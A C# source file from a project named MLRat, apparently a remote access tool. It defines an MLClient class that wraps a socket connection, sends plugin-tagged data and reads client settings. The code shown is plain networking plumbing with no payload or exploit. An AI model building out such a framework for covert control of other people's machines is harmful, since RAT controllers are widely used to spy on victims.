using MLRat.Handlers;
using MLRat.Server;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace MLRat.Networking
{
    public class MLClient : IClient
    {
        private Guid _clientID, _pluginID;
        private eSock.Server.eSockClient Client;
        public object TagData { get { return Client.Tag; } }
        public MLClient(Guid id, Guid pid, eSock.Server.eSockClient _client)
        {
            _clientID = id;
            _pluginID = pid;
            Client = _client;
        }
        public Guid ID
        {
            get { return _clientID; }
        }

        public void Send(params object[] data)
        {
            Client.Send(_pluginID, (object) data);
        }

        public T GetVariable<T>(string name, T defaultValue)
        {
            try
            {
                MLClientData data = (MLClientData)Client.Tag;
                return data.Settings.GetSetting<T>(name, defaultValue);
            }
            catch
            {
                return defaultValue;
            }
            
        }
    }
}
